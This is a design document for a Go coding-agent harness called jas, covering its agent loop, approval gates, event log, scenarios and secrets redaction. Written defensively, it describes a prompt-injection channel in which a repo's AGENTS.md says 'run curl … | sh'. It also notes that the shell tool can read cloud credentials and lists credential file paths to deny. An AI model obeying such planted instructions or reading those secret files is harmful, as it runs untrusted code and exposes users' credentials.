# jas — design & proposal

> A tiny, fast coding-agent harness in Go. "Hermes-lite, developer-first."

**Status:** picked (weekend project #26, absorbs #7 Rapid / #22 worktree farm / #12 cron cockpit)
**Repo:** https://github.com/jasonli0226/jas
**Language:** Go (rationale below)
**Design review:** findings filed as [#1](https://github.com/jasonli0226/jas/issues/1)–[#13](https://github.com/jasonli0226/jas/issues/13); decisions below encode the accepted comments.
**Market research (2026-10):** [research/market-comparison-2026-10.md](research/market-comparison-2026-10.md) — jas vs 15 harnesses; recommendations map to open issues.
**Farm research (2026-11):** [research/farm-multi-agent-community-2026-11.md](research/farm-multi-agent-community-2026-11.md) — multi-agent coding evidence and community pain points.
**Specs:** farm — [superpowers/specs/2026-11-02-farm-design.md](superpowers/specs/2026-11-02-farm-design.md) (draft; waits for its prerequisites, §5) · session awareness — [superpowers/specs/2026-11-02-session-awareness.md](superpowers/specs/2026-11-02-session-awareness.md) (proposed; core loop, ships before farm) · spec-driven flow — [superpowers/specs/2026-11-02-spec-driven-flow.md](superpowers/specs/2026-11-02-spec-driven-flow.md) (proposed; `jas spec` interview, scaffold phase, section runs; farm plans from it).

---

## 1. Why "jas" and why another agent?

The AI coding-agent market is drowning in "yet another CLI agent." The gap is not
intelligence — models are the brain — it's the **harness**: process/IO/session/status
plumbing. The pain points we've personally hit across Hermes, pi, Claude Code, Codex:

1. **Cold start / overhead** — agents are slow to start, spawn heavy runtimes
2. **No parallelism** — one task per session; you juggle terminal tabs
3. **No visibility** — you can't see what N running agents are doing at a glance
4. **Not composable** — tools/skills/MCP are bolted on, not pluggable

jas bets on: **small core, pluggable everything, visible by default.**
The model is the brain; jas is the nervous system.

**Owner usage (2026-11-03):** day-to-day jas is **inline chat for pair
programming**, **starting projects from instructions** (and later scenarios /
`jas spec` scaffold), and **studying an existing repo to draft a scenario**
(`jas bootstrap`, §8.3). The JSONL event log, exit codes, and `jas run --json`
are the CI-grade receipt that chat and one-shot share; farm is for big,
check-gated splits — not a claim that multi-agent always beats one agent.
Versus pi: different jobs (interactive product depth vs chat + templates on an
auditable harness); see §14 and [use-cases.md](use-cases.md).

## 2. Language choice: Go (decided)

Considered Rust seriously. Decision matrix:

| Factor | Go | Rust |
|---|---|---|
| Cold start / binary | ~5-10ms, ~12MB ✅ | ~3ms, ~10MB ✅ |
| Parallelism model | goroutines + errgroup = *exactly* the N-parallel-agent model | tokio + Arc/Mutex dance |
| Dev velocity (weekend-sized) | high | borrow-checker friction on iterated harness code |
| MCP SDK | official ✅ | official ✅ |
| Longevity for harness work | good | great (fearless refactoring) |

**The bottleneck is the LLM round-trip (~2s), not the harness.** Rust's marginal
perf win is invisible; Go's velocity win is real. If Rust ever becomes the goal,
the agent-loop design here ports cleanly — the core is 6 interfaces (§3).

Prompt assembly is **cache-friendly** (see #5): stable prefix order is
`system → tools → early messages` so providers with prompt caching keep hitting
the same prefix. Anything that rewrites earlier messages breaks that prefix, so
tool-result elision (§3) runs in **chunks at a threshold**, not every turn. Cold start stays a hygiene metric (§7); the metrics that
actually measure the harness are cache-hit rate, turns/task, and tokens/task.

## 3. Architecture

```
jas (single Go binary)
│
├── core/                    the harness
│   ├── session.go           one session = prompt + model + toolset + event log
│   ├── loop.go              the agent loop: build prompt → stream → parse tool calls → execute
│   ├── tools.go             Tool interface + registry (read-only vs mutating)
│   ├── sandbox.go           exec policy (cwd, timeout, deny patterns, env allowlist,
│   │                        path confinement). Shell is YOLO in v1 — see §3.1 / #1
│   ├── approve.go           --approve=never|shell|mutating gate (v1; default never)
│   ├── trust.go             project trust for AGENTS.md/CLAUDE.md (v1), scenarios (v2)
│   ├── redact.go            output redaction middleware (§9 layer 2)
│   ├── budget.go            token tracking + chunked tool-result elision (v1); compaction (v2)
│   └── events.go            versioned JSONL events (single writer; §3.2)
│
├── providers/               provider-neutral stream; OpenAI chat-completions adapter (v1)
│   ├── types.go             Message / ContentBlock / StreamEvent (provider-neutral)
│   └── openai.go            OpenRouter/vLLM/ollama. Retry/backoff, SSE idle timeout.
│
├── tools/                   built-in toolset (v1; web = v2 opt-in; mcp/git_clone later)
│   ├── shell.go             run commands (YOLO + --approve gate; §3.1)
│   ├── files.go             read/write/edit/ls (edit = exact-match replace, see below)
│   ├── grep.go              regex search (ripgrep-style, no ripgrep dep)
│   ├── web_fetch.go         HTTP GET → HTML→text; behind web_tools=true (§12.1)
│   ├── web_search.go        SearXNG / DuckDuckGo chain; behind web_tools=true (§12.1)
│   ├── git_clone.go         shallow clone, path-confined to session dir (deferred; §12.1)
│   └── mcp.go               MCP client (stdio + HTTP) — external tools become tools (v2)
│
├── settings/                ~/.jas/ agent dir (§10; global scope v1, project scope v2)
│   ├── config.go            prefs: CLI > JAS_* > local > project > global > defaults
│   ├── auth.go              auth.json (0600) / $ENV references, key resolution
│   └── models.go            compiled-in model catalog (context window) + config overrides
├── scenario/                loader + merger + bootstrap (§8, v2)
│   ├── loader.go            .jas/scenario.yaml discovery, layer-merge
│   └── bootstrap.go         deterministic project scan → draft scenario.yaml
│
├── farm/                    split one task into parts (v2, spec: superpowers/specs/2026-11-02-farm-design.md)
│   ├── plan.go              planner agent drafts plan.yaml; validation in code
│   ├── supervisor.go        runs parts in DAG order, one worktree + branch + session each
│   ├── board.go             append-only board.jsonl of typed commitment posts, delivered as fenced context
│   └── integrate.go         integrator agent merges branches; the supervisor runs `check`
│
├── ui/                      visibility (inline only — AGENTS.md: no fullscreen TUI)
│   └── attach.go            after farm: `jas attach <part>` — client of the farm's Unix socket (§5)
│
└── cmd/jas/
    ├── main.go              single binary entry
    └── commands.go          jas run | jas config | jas auth (v1) · jas farm (v2) · attach | tasks (later)
```

### The six interfaces

README's "6 interfaces total" are these (everything else is data or a thin
adapter). See also #5.

| # | Interface | Role |
|---|---|---|
| 1 | `Provider` | `Stream(ctx, req) ←chan StreamEvent` — LLM round-trips |
| 2 | `Tool` | `Name / Schema / Call` — built-ins + MCP wrappers |
| 3 | `EventLog` | append-only versioned JSONL writer (audit + resume + future RPC) |
| 4 | `ExecPolicy` | project root, timeout, env allowlist, path confinement, deny patterns |
| 5 | `Approver` | `--approve=never\|shell\|mutating` gate before tool exec |
| 6 | `UI` | print / JSONL-stdout / (v2) TUI+attach |

Provider-neutral types live in `providers/types.go`: `Message`, `ContentBlock`
(text / tool_use / tool_result), `StreamEvent`, `Usage`. The OpenAI
chat-completions + SSE adapter is the only v1 backend; Anthropic-style deltas
are handled inside that adapter (or a later one), never leaked into the loop.
The provider layer retries 429/5xx with exponential backoff and enforces an
SSE idle timeout (no bytes for N seconds → cancel the stream).

### The agent loop (core, ~200 lines)

```go
for turn := 0; turn < maxTurns; turn++ {      // JAS_MAX_TURNS, default 50
    if budget.WouldExceed(messages) {         // last usage.prompt_tokens + estimate
        return errContextFull                 // for messages added since; exit 3
    }
    stream := provider.Stream(ctx, messages)  // SSE; retry/backoff inside provider
    acc := newAccumulator()                   // tool calls arrive as *deltas*
    for ev := range stream {                  // single pass: print text AND reassemble
        if ev.Text != "" { ui.Print(ev) }
        acc.Add(ev)
    }
    msg, tc := acc.Done()
    messages.Append(msg)
    if len(tc) == 0 { break }                 // no tool calls → final answer
    results := exec.Run(ctx, tc)              // see Tool execution policy below
    // errors are RESULTS, not failures — the model sees the error and retries
    messages.Append(results...)
    budget.MaybeElide(messages)               // only past the threshold, in one chunk
    // ctx cancel (Ctrl-C): abort stream, synthesize cancelled tool results, flush log
}
// loop exits on turn cap → errTurnCap (exit 4)
```

### Tool execution policy

Each tool declares whether it is read-only (`read`, `ls`, `grep`) or mutating
(`write`, `edit`, `shell`). MCP tools default to **mutating** unless the MCP
descriptor sets `readOnlyHint` (safe default: external tools are untrusted).
See #3.

Execution batches by consecutive kind:

1. Walk the model's `tool_calls` in order.
2. A run of consecutive read-only calls executes **in parallel** (errgroup).
3. Each mutating call is a **barrier**: wait for the prior batch, run the
   mutator alone, then continue. `[read A, edit A, read A]` therefore observes
   A before and after the edit — never both reads racing the edit.
4. Results are always returned in `tool_call` order, regardless of completion
   order.

Every tool result is capped (`JAS_MAX_TOOL_OUTPUT`, default 32KB): longer
output is truncated with a `[truncated: N more lines]` marker. On top of that,
v1 tracks prompt tokens against the model's context window (see #2):

- **Window size** comes from a compiled-in model catalog (pi keeps the same
  data in `models-store.json`), overridable per model with the
  `context_window` config key (§10). Unknown model, no override → assume
  128k and log a warning.
- **Token count** = the last response's `usage.prompt_tokens` plus a
  `len(bytes)/4` estimate for every message appended since. That covers the
  first request and the turn right after a large tool result, where no usage
  number exists yet. Until the first usage number (and again after a
  compaction), the estimate also adds `len(bytes)/4` of the system prompt and
  tool schemas, which the messages don't contain. Compaction's kept tail
  leaves room for that overhead under the trigger.
- **Elision is chunked to protect the prompt cache** (§2). Nothing is rewritten
  until the count crosses `elide_at` (default 60% of the window). Then, in one
  pass, every tool result except the last K becomes
  `[elided: read foo.go 412 lines]`. The prefix changes once per pass, not once
  per turn, so cache hits resume on the next request.
- A provider `context_length_exceeded`, or a count still over the window
  after elision, becomes a clean stop (exit 3). Full summarization compaction
  (pi's `window − reserve` threshold) stays v2.

### Event log & resume

Every step appends a versioned JSONL event to `<session>/events.jsonl` — the
audit log and, from v2, the checkpoint/resume + RPC wire format. Record shape
from day one (see #6):

```json
{"v":1,"id":"…","parent_id":"…","seq":42,"ts":"…","type":"tool_started", …}
```

`parent_id` is the previous event's id, forming a linear chain. `seq` and `id`
continue across reopen (resuming from the last event). The session file is
locked while open (write-ahead & replay safety).

**Event types (v1 contract).** `--json` consumers and the v2 RPC protocol
depend on this list. Adding a type or field is backward compatible. Renaming or
removing one bumps `v`. Replay refuses a file with an event whose `v` is
newer than it reads, rather than misread it.

| type | payload | when |
|---|---|---|
| `session_started` | model, provider (resolved name), base_url, approve level, project root, context files loaded, skills listed (name, scope, location) | once per file, first |
| `session_resumed` | model, provider (resolved name), base_url, approve level, project root, context files loaded, skills listed (name, scope, location) | once per reopen, after replay |
| `user_message` | content (wire blocks), steer (optional bool) | when user sends a message or steering text |
| `turn_started` | (empty) | at start of each user message, including a steer delivered after the final answer |
| `assistant_message` | text, content (wire blocks), final (bool) | after each stream; final on the answer turn; a `tool_use` block whose arguments aren't valid JSON stores them as the string `input_raw` instead of `input` |
| `usage` | prompt_tokens, completion_tokens, cached_tokens | after each provider response |
| `tool_started` | tool, call_id, args, mutating | before exec (fsynced first if mutating) |
| `approval` | call_id, tool, decision (granted\|denied\|unavailable) | when the Approver is consulted |
| `tool_result` | call_id, tool, status (ok\|error\|denied\|cancelled\|interrupted\|not_run), output; optional `diff` after an ok `write` (`path`, `hunks` of `{k,o,n,t,s}`, `truncated`; a `write` over an existing file logs added lines only; an `edit` logs no `diff`: its full diff, like a write's, is screen-only); replay ignores `diff` | after exec |
| `elided` | count, tokens_before, tokens_after | each elision pass |
| `turn_ended` | status, exit_code, reason, turns, prompt_tokens, completion_tokens | at end of each user message; `turns` counts the model requests within it |
| `model_changed` | model (bare id), provider, base_url (the session's endpoint; never a key) | when SetModel is called; replay and resume take provider and base_url from the latest of these three events that carries them |
| `session_titled` | title (one line, ≤80 runes; "" clears) | when SetTitle is called (`/name`, `jas --name`); the latest wins. `session_started` may also carry `title` (`jas run --name`) |
| `compaction` | summary, first_kept_id, tokens_before, tokens_after, usage | when history is compacted (chat only) |
| `session_ended` | status, exit_code, turns, prompt_tokens, completion_tokens | once each time closed; totals cover the current open only; absent after a crash |

**Single writer:** all appends go through one `EventLog` goroutine;
concurrent callers send events. The writer fsyncs after each turn's tool
results — and, for mutating calls, fsyncs `tool_started` **before** the call
executes (write-ahead; see #4).

**Side effects and resume (v1 contract):**

1. Mutating call → fsync `tool_started` → execute → `tool_result`.
2. On resume, a `tool_started` with no matching `tool_result` is **never**
   re-executed. Replay answers it with an error result reading "interrupted:
   jas stopped while this call was running; it may have partly run. Inspect the
   current state before retrying.", and `ResumeSession` appends a `tool_result`
   with status `interrupted` and that text right after `session_resumed`, so
   later replays find a real result. A `tool_use` with no `tool_started` never
   ran: replay answers it with "not run: jas stopped before this call started;
   it had no effect." and `ResumeSession` logs status `not_run`. This is an
   **at-most-once** guarantee, not
   atomicity. A crash during a shell command can leave its side effects half
   done. The result says so, and the model decides what to do next.
3. `write`/`edit` are atomic on their own: write a temp file in the same
   directory, fsync, then `rename`. A crash leaves the old file or the new
   one, never a torn mix.
4. Ctrl-C mid-turn synthesizes `cancelled` tool results for any dangling
   `tool_calls` so the next chat-completions request is well-formed (no 400).
5. Shell children run with `Setpgid: true`; cancel kills the process group and
   uses `WaitDelay` so grandchildren cannot outlive the tool call.

### 3.1 Shell security stance (v1)

**pi-style YOLO, documented loudly** (see #1). Path confinement and the deny
floor apply to the *file* tools. The `shell` tool inherits an allowlisted env
(`PATH`, `HOME`, `USER`, `LANG`, `TERM`, `TMPDIR`, plus scenario additions)
and can still reach anything `HOME` can — `cat ~/.aws/credentials`,
`python -c`, `curl`. In-process string guards on the command line are theater
and are **not** claimed as a security boundary.

- v1 CLI: `--approve=never|shell|mutating` (default `never` = permissive).
  The tool-exec path always consults the Approver so the gate is real even
  when it defaults open. It is a ladder, each level gating a superset of the
  one before:

  | level | prompts before |
  |---|---|
  | `never` | nothing |
  | `shell` | every `shell` call |
  | `mutating` | every mutating call: `shell`, `write`, `edit`, MCP tools without `readOnlyHint` |

  The default can be persisted with `jas config set approve <level>` (§10).
- **Denial** (interactive): the call gets a `tool_result` with
  `status: denied` and the run continues. The model sees the denial and
  picks another route. It is a result, not a failure.
- **No TTY** (CI, `--json` piped, stdin not a terminal): a gated call cannot be
  answered. jas records `approval: unavailable` and stops with exit 5, so a CI
  job that asked for a gate fails loudly instead of hanging or silently
  proceeding. CI that wants unattended runs uses `--approve=never` inside a
  container.
- If you care about isolation: run jas (or each farm part) inside
  **bubblewrap/Docker**. That is the documented answer in v1 and the planned
  per-task option in v3 — not a pretend in-process sandbox.

### Exit codes (v1 contract)

Tool errors are results the model sees (loop above), so they never set the
exit code by themselves. The process exit code reflects how the *run* ended:

| code | meaning |
|---|---|
| 0 | model gave a final answer |
| 1 | provider failure after retries, config error, or internal error |
| 2 | usage error (bad flags, missing model/key) |
| 3 | context full (`context_length_exceeded`, or over the window after elision) |
| 4 | turn cap (`max_turns`) hit |
| 5 | approval required but no TTY to ask |
| 6 | farm unmet: the supervisor's `check` failed or a part failed/was dropped; the final event's `reason` says which |
| 7 | budget exceeded: token or wall-clock cap (`jas run --max-tokens/--timeout`, farm totals); `reason` is `tokens` or `timeout`, after a `budget_stop` event |
| 8 | farm planner refused to split (use `jas run`) |
| 130 | interrupted (Ctrl-C / SIGTERM) |

The same code appears in the `session_ended` event, with a `reason` on every
non-zero exit.

### The Tool interface (the whole extensibility story)

```go
type Tool interface {
    Name() string
    Schema() json.RawMessage   // JSON-schema for the model
    Call(ctx, args json.RawMessage) (Result, error)   // ctx carries timeout + sandbox
}
```

- Built-ins implement it directly.
- MCP servers (v2) are loaded at startup and wrapped into the same interface;
  default to mutating unless `readOnlyHint` is set (Tool execution policy above).
- **Edit format:** the `edit` tool takes `{path, old_string, new_string}`.
  `old_string` must match exactly once in the file (otherwise the call returns an
  error asking for more context). This is the same exact-match format pi and
  Claude Code use; it is more reliable with current models than unified diffs.
  `write`/`edit` refuse content containing a `[REDACTED:` marker (§9) with an
  explicit **"region contains redacted content"** error (not a silent no-match
  loop — see #7). Per-path opt-out covers fixture/docs paths that legitimately
  hold example keys.
- **Path confinement:** file tools resolve paths with `filepath.EvalSymlinks`
  and refuse anything outside the project root before the deny-list check runs.
  (Does not confine `shell` — see §3.1 / #1.) **Project root** = `git rev-parse
  --show-toplevel` from cwd, else cwd. For a farm part it is that part's
  worktree. The root travels in `ExecPolicy`. jas never calls `os.Chdir`,
  because farm parts share one process (§5), and shell children get the root
  as their `Dir`.
- **Shell environment:** `shell` runs children with an allowlisted environment
  (`PATH`, `HOME`, `USER`, `LANG`, `TERM`, `TMPDIR`, plus names the scenario
  adds), never jas's own environment. `JAS_API_KEY` and other provider keys
  are never visible to tools.
- **Project instructions (v1):** load `AGENTS.md` (and `CLAUDE.md` as a
  fallback) from the project root into the system prompt — ~20 lines, large
  lift (#8). Complements, does not replace, `scenario.yaml` runtime policy (#9).
  These files come from the repo, so they are a prompt-injection channel. With
  the default `--approve=never`, "run `curl … | sh`" in a cloned repo's
  `AGENTS.md` would just execute. v1 therefore ships the **project trust gate**
  for context files (pi gates project-local files the same way): the first time
  jas sees context files in a project, it asks `trust this project?
  [y/N/always]`. The answer is cached in `~/.jas/trust.json`, keyed by root
  path plus content hash, so an edit asks again. Without a TTY, untrusted
  context files are **skipped with a warning** unless `--trust-project` is
  passed. v2 extends the same gate to scenarios (§11).
- **Skills (shipped after v1):** a skill = `SKILL.md` per the agentskills.io
  spec, discovered in `.agents/skills` and `.claude/skills` (project, then
  user), listed in the system prompt (pi's `<available_skills>` block) and
  loaded on demand with the `read` tool, which may open listed skill
  directories (`ExecPolicy.ReadRoots`). Project skills share the context
  file's trust prompt. Optional tool manifests stay v3. Research:
  `docs/research/agent-skills.md`.

## 4. v1 scope (weekend one)

**Goal:** a single Go binary that beats `pi --print` on cold start and runs a real
coding task end-to-end.

- [ ] `jas run "task string"` — streaming chat loop, OpenAI-compatible endpoint
- [ ] `jas run --json` — emit events to stdout as JSONL (cheap; the future RPC wire format)
- [ ] `jas run --approve=never|shell|mutating` — approval ladder on the tool-exec
      path (default `never`; no TTY + gate → exit 5; see §3.1 / #1)
- [ ] exit-code contract (§3) and the v1 event-type list (§3), both documented
      and tested
- [ ] built-in tools: shell, read/write/edit file, ls, grep
- [ ] tool execution policy: consecutive read-only batches in parallel; each
      mutating call is a barrier; MCP defaults mutating unless `readOnlyHint` (§3 / #3)
- [ ] context budget (#2): usage + estimate vs catalog window; chunked elision
      at `elide_at`; `context_length_exceeded` → clean stop (exit 3)
- [ ] `max_turns` cap (default 50; config/flag/`JAS_MAX_TURNS`) — cost caps are
      v2, so v1 needs a runaway stop (exit 4)
- [ ] SSE tool-call delta reassembly (fuzz-tested against recorded streams);
      provider retry/backoff on 429/5xx; SSE idle timeout (#5)
- [ ] versioned JSONL event log at `~/.jas/sessions/<id>/events.jsonl`
      (`v`, `id`, `parent_id`, `seq`, `ts`, `type` — #6); single writer;
      fsync `tool_started` before mutating exec; atomic `write`/`edit`
      (temp + rename); synthesize `cancelled` results on Ctrl-C; process-group
      kill (#4). Token usage logged per request
- [ ] load `AGENTS.md` / `CLAUDE.md` from the project root into the system
      prompt (#8), behind the v1 project trust gate (§3)
- [ ] secrets layers 1, 2 and 4 (§9): compiled-in deny floor, output redaction
      (with explicit redacted-region edit error + per-path opt-out — #7),
      redacted event log; shell env allowlist; path confinement (file tools)
- [ ] persistent config, pi-style (§10): first-run onboarding, `jas config
      set|get|unset|list`, `jas auth add|list|rm|rotate`, stored in
      `~/.jas/config.json` + `~/.jas/auth.json` (0600). Per-run flags
      (`--model`, `--base-url`, `--provider`) and `JAS_*` env vars override it
- [ ] benchmarks: hygiene cold start; primary = cache-hit / turns / tokens (§7 / #13)
- [ ] README + demo GIF

**Explicitly out of v1:** MCP, TUI, farm, skills, scenarios (project trust
ships in v1 for context files only), project-scoped settings, full
summarization compaction. Resist scope creep.
Shell isolation for people who care = run under bubblewrap/Docker (documented;
per-task containers ship in v3).

## 5. v2 scope (weekend two+)

- [ ] **Spec-driven flow** (proposed; core loop, works without farm) —
      `jas spec` grill-me interview → approved spec (hash in the event log);
      `jas spec --check` / `jas run --spec` fail headless with open questions
      (exit 2); bounded `--phase scaffold`; single-agent `--section` runs that
      cite acceptance criteria. Spec:
      [superpowers/specs/2026-11-02-spec-driven-flow.md](superpowers/specs/2026-11-02-spec-driven-flow.md)
- [ ] **Session awareness** (proposed; core loop, not farm) — each chat /
      `jas run` session registers a small record in `<repo>/.jas/sessions/`
      (title, branch, touched files, heartbeat); read-only peers note and
      tool; warn/ask before writing a file another active session touched.
      Can ship before farm. Spec:
      [superpowers/specs/2026-11-02-session-awareness.md](superpowers/specs/2026-11-02-session-awareness.md)
- [ ] `jas farm plan` / `jas farm run` — for tasks too big or slow for one
      agent, done safely and auditably (not "better than one agent"; see
      [research](research/farm-multi-agent-community-2026-11.md)). A planner
      drafts `plan.yaml` or refuses (default; suggests `jas run`), the owner
      approves it (plan hash), the supervisor (code, no LLM) runs 2–3 parts in
      parallel in worktrees outside the repo, workers post typed commitments to
      a board, an integrator merges, and the supervisor runs `check` as the
      verdict. Pinned CI contract (exit codes 6/7/8, `--json`, manifest; no
      TTY = keep). Replaces the earlier best-of-N `--n` design. **Waits for
      its prerequisites:** event-log spec, provider fidelity, run token/time
      caps, opt-in sandbox, supervisor-run success check + benches, then a
      farm-vs-`jas run` benchmark gate. Spec:
      [superpowers/specs/2026-11-02-farm-design.md](superpowers/specs/2026-11-02-farm-design.md)
- [ ] Farm `reviewer` part (replaces the earlier discussion mode): an
      optional read-only part with a clean context, possibly a different
      model, reviewing the integrated diff; after farm
- [ ] `jas attach <task>` (after farm) — connects to the farm's Unix socket
      (`~/.jas/run/<farm-id>.sock`, 0600) and speaks the RPC protocol. Attach
      waits for the task's current turn to finish (no mid-stream handoff), then
      routes the human's messages in through the steering queue. Live
      supervisor = no replay. If the supervisor is gone, attach falls back to
      `jas resume` (event-log replay, §3 side-effect rules)
- [ ] MCP client support (stdio first, then HTTP)
- [ ] Farm interactive mode (`/farm` in chat): inline plan approval, one live row per part updated in place, part-scoped approvals, `/farm attach <part>`; same supervisor and logs as CI; no fullscreen board (AGENTS.md); after the farm CI path
- [x] **Auto-compaction** (pi parity): trigger at `window − reserve`
      (16k default); summarize older history with a cheap model into a summary
      entry; originals kept in the session file (v1 already elides tool results)
- [ ] **Session tree**: `parent_id` already on events from v1 → branches, fork,
      clone (branch summaries reuse compaction)
- [ ] **RPC mode**: the §3 event types plus a command set, as JSONL. Two
      transports: stdio (`jas serve`, for a parent process such as an IDE or
      the Telegram bot) and a Unix socket (the farm supervisor, for `attach`
      and the TUI from another terminal)
- [ ] **Scenarios** (§8), with the v1 project trust gate (§3) extended to
      scenario files and hook scripts (§11)
- [x] **Claude 3-way settings** (§10): global / project `config.json` /
      `config.local.json`, plus `/settings`; prefs stay out of `scenario.yaml`
- [x] **Checkpoint/resume** from `events.jsonl` replay (§3 side-effect rules):
      shipped for the chat as `jas --continue` and `/resume`
- [ ] **Blind secret access** (§9 layer 3)
- [x] **Web access (partial)**: in-tree `web_fetch` + `web_search` behind `web_tools=true` (§12.1); `git_clone` still deferred
- [x] **Steering & follow-up queues**: Enter during a run steers (next
      step), Ctrl+Q queues a follow-up (sent after the run ends ok), Alt+Up
      pops the queue back into the input. Queued texts go out together;
      pi's one-at-a-time mode is not built
- [ ] **Evals**: fixed-task eval harness with fixtures — with/without scenario
      lift reports (pi's vitest-evals idea, simplified)

## 6. v3 ideas

- skill tool manifests — Hermes-style. Instruction-only `SKILL.md` skills
  (agentskills.io spec) already shipped (§3)
- optional `.mcp.json` interop alongside `scenario.yaml`'s `mcp:` block
  (scenario.yaml remains the single runtime-policy format — #9)
- **`jas learn <topic>`**: research → draft → human approval → save a skill (§12.2)
- codemode: model-written JS in a **goja** (pure-Go JS) sandbox, tools as the
  only capability (absorbs backlog #14 mini-codemode)
- virtual models: routing model that dispatches each request to a physical
  model (`jas/auto:low → cheap-model`) (absorbs backlog #3)
- git-installable scenario/skill packages (`jas scenario install git:…`)
- containerized farm tasks (bubblewrap/Docker) — same isolation answer
  documented for v1 (#1), now a first-class per-task option
- tool-trace replay & cost simulator (absorbs backlog #11)
- Jev-classifier tool-risk gate (absorbs #5)
- OTel export of sessions (telemetry)

## 7. Benchmarks (v1 acceptance)

Cold start stays a **hygiene** metric (guards accidental dependency bloat —
essentially free via `go build`). Primary metrics measure whether the harness
(prompt construction, tool policy, output caps, elision) is efficient — which
is jas's thesis. See #13.

| kind | metric | target |
|---|---|---|
| hygiene | cold start | < 50ms (`jas --version`; `jas run` up to the first HTTP request sent) |
| hygiene | binary size | < 15MB static |
| primary | cache-hit rate | report vs pi on the same model/provider (stable prompt prefix §2) |
| primary | turns / task | 3 fixed tasks: fewer is better; "add a header comment to main.go" ≤ 3 turns |
| primary | tokens / task | same 3 fixed tasks: total prompt+completion tokens reported vs pi |
| secondary | wall-clock / TTFT | reported alongside, not optimized for |

## 8. Scenarios: declarative runtime policy (v2)

A scenario = a preset bundle of (system prompt + toolset + sandbox policy + hooks).
**Scenarios are data, never hard-coded.** `.jas/scenario.yaml` in a repo governs
how jas operates there — the **single runtime-policy format** (deny patterns,
sandbox, toolsets, hooks, mcp). See #9.

- **AGENTS.md** (adopted in v1, #8) complements scenario.yaml: project
  instructions for the model. It cannot express runtime policy.
- **SKILL.md** skills shipped (§3) and **`.mcp.json`** stays on the v3 roadmap
  for interop; neither replaces `scenario.yaml`.
- **Blueprints** (scaffold-from-preset / `jas new` / `jas scenario save`) are
  **dropped** — they don't advance the agent loop. `jas bootstrap` (below)
  still drafts a scenario from an existing project.

### 8.1 Discovery & precedence (most specific wins, layer-merge)

Scenario **policy** discovery (separate from prefs in §10):

```
CLI flag            jas run --scenario <name|path>  explicit, wins (name → ~/.jas/scenarios/<name>/ or built-in)
└── project         .jas/scenario.yaml              tools/hooks/sandbox/MCP only — not prefs
    └── global      ~/.jas/scenarios/<name>/
        └── built-in scenarios/ (Go-compiled)       2-3 starter presets
```

Plain prefs (`model`, `approve`, …) use the Claude 3-way config files in §10
(`config.local.json` / project `config.json` / `~/.jas/config.json`), not
`scenario.yaml`.

### 8.2 Scenario file (declarative YAML, checked into the repo)

```yaml
# .jas/scenario.yaml
name: my-ml-project
system: |
  You work on an ML research repo. Experiments live in experiments/;
  never touch data/ directly; log every run to results.jsonl.
tools:
  core: [shell, files, grep]
  python: {exec: uv, venv: .venv}
sandbox:
  deny: ["data/**:write", ".git/**:write", ".env*", "secrets/**", "**/.env"]
hooks:
  post_run:    [{script: .jas/hooks/summarize-metrics.sh}]
  pre_apply:   [{script: .jas/hooks/lint.sh}]   # before file-mutation applied (#10)
mcp:
  - {command: uvx, args: [mcp-server-git]}
```

`pre_apply` runs before any file-mutation tool result is applied to disk
(renamed from the earlier `pre_commit`). See #10. **Commit rule:** jas never
commits to a branch it did not create. The only commits jas makes are farm
commits on its own `jas/farm/<farm-id>/*` branches, with a stated identity
and `Jas-Farm:` / `Jas-Part:` trailers; the owner's branch changes only when
the owner picks *merge* (farm spec, Commits).

### 8.3 `jas bootstrap` — scenario from an existing project (no LLM)

Deterministic heuristics, instant and repeatable. Writes a draft
`.jas/scenario.yaml` the user hand-edits:

| Signal | Generated |
|---|---|
| `pyproject.toml`/`requirements.txt` | python toolset (uv), venv path, pytest hook |
| `package.json` | node toolset, npm script shortcuts, jest/vitest hook |
| `go.mod` | go toolset, `go test ./...` pre_apply hook |
| `Makefile` targets | named tool shortcuts (`make train` → tool `train`) |
| `experiments/` + `results.jsonl` / MLflow/W&B config | ML guardrails (data/ deny, run logging) |
| `next.config.*`/`vite.config.*` | web-app preset: dev-server + screenshot tools |
| `AGENTS.md`/`CLAUDE.md` | noted; already loaded in v1 — bootstrap may mirror into `system` |
| `.env` present | listed as required env + added to sandbox deny (never read) |
| `.mcp.json`/Hermes config | converted into the `mcp:` block |

What stays compiled-in: only tool *implementations* and the loader/merger.
Scenarios are 100% data.

## 9. Secrets & sensitive data (layers 1, 2, 4 = v1; layer 3 blind secret access = v2)

**Principle: the agent never sees secret *values* — not in tool output, not in
the transcript, not in the event log.** How peers do it, and what jas adopts:

| Approach | Who uses it | jas |
|---|---|---|
| Env passthrough (agent process gets keys) | many naive agents | ❌ root of all leaks |
| Deny-list file reads | Claude Code (`.env` in default ignores) | ✅ baseline |
| Redaction middleware on tool output | pi, modern harnesses | ✅ output scrubber |
| Secret proxy (harness holds keys, agent requests "use key X" blind) | OpenAI Codex cloud, pi | ✅ v2 |
| Env scrubbing for tool subprocesses | Codex, pi | ✅ v1 — shell gets an allowlisted env (§3) |
| Isolated sandbox FS (no dotfiles mounted) | cloud agents | 🔜 documented v1 answer = bubblewrap/Docker (#1); first-class per-task containers in v3. Git worktrees are *not* isolation — they share the user's FS and home dir |

Concretely, four layers (defense in depth — any one failing must not leak):

1. **File deny-list.** v1 ships a **hard floor** compiled into the binary:
   `.env*`, `**/.env`, `secrets/**`, `*.pem`, `id_rsa*`, `*.p12`,
   `.git-credentials`, `~/.aws/**`, `~/.ssh/**`, `~/.jas/**` (plus `$JAS_HOME`
   when set). From v2, scenarios can add
   patterns via `sandbox.deny`; `deny` is additive and the floor cannot be
   lifted. Patterns are matched against the symlink-resolved path (§3).
2. **Output redaction** (core middleware, runs on every tool result before it
   enters the model transcript or event log). Three rules, in order of
   confidence:
   - **Exact values** jas knows are secret: `JAS_API_KEY`, every key in
     `auth.json` (v2), every declared scenario secret (v2). Cheapest and strongest.
   - **Known token shapes:** `sk-…`, `ghp_…`, `AKIA…`, `Bearer …`, JWTs,
     `-----BEGIN … PRIVATE KEY-----`.
   - **High-entropy values only in an assignment context** (`KEY=value`,
     `"key": "value"`, `key: value` where the key name looks secret-ish).
     Bare high-entropy strings and long base64 are *not* redacted: that would
     hit `go.sum` hashes, lockfiles and test fixtures, and the model would then
     write `[REDACTED:…]` back into source files.

   Matches are replaced with `[REDACTED:<kind>]`. `write`/`edit` refuse content
   containing that marker with an explicit **"region contains redacted
   content"** error (§3 / #7) so the model doesn't loop on a silent no-match.
   Per-path opt-out (fixture/docs paths) is the escape hatch for legitimate
   example keys. The scrubber is tested against a fixture corpus that includes
   false-positive cases (`go.sum`, `package-lock.json`, UUIDs) **and** against
   a sample of real repos — `go.sum` alone is a worst-case corpus, not a
   representative FP rate (#7).
